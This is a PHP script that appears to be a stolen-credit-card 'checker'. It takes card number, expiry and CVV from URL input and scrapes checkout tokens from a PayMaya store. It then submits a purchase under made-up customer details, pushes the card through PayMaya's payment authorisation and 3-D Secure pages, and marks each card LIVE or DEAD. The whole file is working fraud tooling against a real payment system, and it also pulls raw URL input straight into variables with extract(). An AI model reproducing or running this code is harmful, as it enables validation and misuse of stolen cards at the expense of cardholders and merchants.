<?php

function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$check = str_replace(" " , "", $check);
$i = explode("|", $check);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$cvv = $i[3];
$m = ltrim($mm, 0);
$yy = substr($yyyy, 2, 4);
$cccom = substr($cc, 0, 4)."-".substr($cc, 4, 8)."-".substr($cc, 8, 12)."-".substr($cc, 12, 16);
$ch = curl_init("https://store.paymaya.com/4861689925/checkouts/1986c62d6b45e2967f3e42645e77f506/forward?complete=1&previous_step=payment_method&step=");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$s1 = curl_exec($ch);
$xsig = GetStr($s1, 'id="x_signature" value="', '"');
$authenticityToken = GetStr($s1, 'name="authenticity_token" value="', '"');
$url_callback = GetStr($s1, 'id="x_url_callback" value="', '"');
$url_comp = GetStr($s1, 'id="x_url_complete" value="', '"');
curl_close($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://lhux1e6adl.execute-api.ap-southeast-1.amazonaws.com/production/purchase');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "authenticity_token=".$authenticityToken."&x_reference=9446325157957&x_account_id=pk-Dom1apryS5EYjfEDzw0HyiFOh3IezIJj2d9Ohs6uFXc&x_amount=250.00&x_currency=PHP&x_url_callback=".$url_callback."&x_url_complete=".$url_comp."&x_shop_country=PH&x_shop_name=PayMaya+Paywave+Card+%7C+PayMaya+EMV+Card+-+Physical+Card&x_test=false&x_customer_first_name=ODELL&x_customer_last_name=FERRY&x_customer_email=takte%40gamil.com&x_customer_phone=%2B63+995+627+2715&x_customer_billing_country=PH&x_customer_billing_city=SALAY&x_customer_billing_address1=SALAY%2C+SALAY%2C+SALAY&x_customer_billing_address2=SALAY&x_customer_billing_zip=1005&x_customer_billing_phone=%2B63+995+627+2715&x_customer_shipping_country=PH&x_customer_shipping_first_name=ODELL&x_customer_shipping_last_name=FERRY&x_customer_shipping_city=SALAY&x_customer_shipping_address1=SALAY%2C+SALAY%2C+SALAY&x_customer_shipping_address2=SALAY&x_customer_shipping_zip=1005&x_customer_shipping_phone=%2B63+995+627+2715&x_invoice=%239446325157957&x_description=PayMaya+Paywave+Card+%7C+PayMaya+EMV+Card+-+Physical+Card+-+%239446325157957&x_url_cancel=https%3A%2F%2Fstore.paymaya.com%2F4861689925%2Fcheckouts%2F1986c62d6b45e2967f3e42645e77f506%3Fkey%3Dc86ca52e5c25ccf0a1b1cf09eecc7306&x_signature=".$xsig);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: lhux1e6adl.execute-api.ap-southeast-1.amazonaws.com';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Origin: https://store.paymaya.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
$headers[] = 'Referer: https://store.paymaya.com/';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$s2 = curl_exec($ch);
$checkoutId = GetStr($s2, '<input type="hidden" value="', '"');

curl_close($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://payments.paymaya.com/v1/payments/auth');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"checkoutId":"'.$checkoutId.'","card":{"number":"'.$cc.'","expMonth":"'.$mm.'","expYear":"'.$yyyy.'","cvc":"'.$cvv.'"}}');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Referer: https://payments.paymaya.com/checkout?id='.$checkoutId;
$headers[] = 'Origin: https://payments.paymaya.com';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
$headers[] = 'Content-Type: application/json';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$s3 = json_decode(curl_exec($ch), true);


$PaReq = urlencode($s3["3dsValues"]["PaReq"]);
$MD = urlencode($s3["3dsValues"]["MD"]);
$s3["3dsUrl"];

curl_close($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $s3["3dsUrl"]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "TermUrl=".$TermUrl."&PaReq=".$PaReq."&MD=".$MD."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Connection: keep-alive';
$headers[] = 'Origin: https://payments.paymaya.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
$headers[] = 'Referer: https://payments.paymaya.com/checkout?id='.$checkoutId;
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$s4 = curl_exec($ch);
curl_close($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $s3["3dsUrl"]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "executionTime=&PaReq=".$PaReq."&MD=".$MD."&TermUrl=https%3A%2F%2Fpayments.paymaya.com%2Fv1%2Fpayments%2F497b107d-2586-4158-a8c4-7a124a72a926%2Fexecute&deviceSignature=&exDeviceSignature=&exDDNAexecutionTime=&DeviceID=&CallerID=&IpAddress=&cancelHit=&CookieType=0&AcsCookie=%21%40%23Dummy%23%40%21&dnaError=&mesc=&mescIterationCount=0&desc=&isDNADone=false&ABSlog=DSP");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Connection: keep-alive';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Origin: https://secure5.arcot.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
$headers[] = 'Referer: https://secure5.arcot.com/acspage/cap?RID=74436&VAA=A';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Accept-Language: fil,fil-PH;q=0.9,tl;q=0.8,en-US;q=0.7,en;q=0.6';
$headers[] = 'Cookie: NSC_T5-mc-443-fyu-dppljf=30dfa3dbc054477a3a58031d3adfd493f037c281f769741e7ced47452b01fcee938bc3f7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$final = curl_exec($ch);

curl_close($ch);
extract($_GET);
if(substr_count($final, $chars) > 0){
  echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$check.'</td><td>Your card has OTP!</td><td>$0</td></tr>';
}else{
  echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$check.'</td><td>Your card has no OTP!</td><td>$0</td></tr>';
}
?>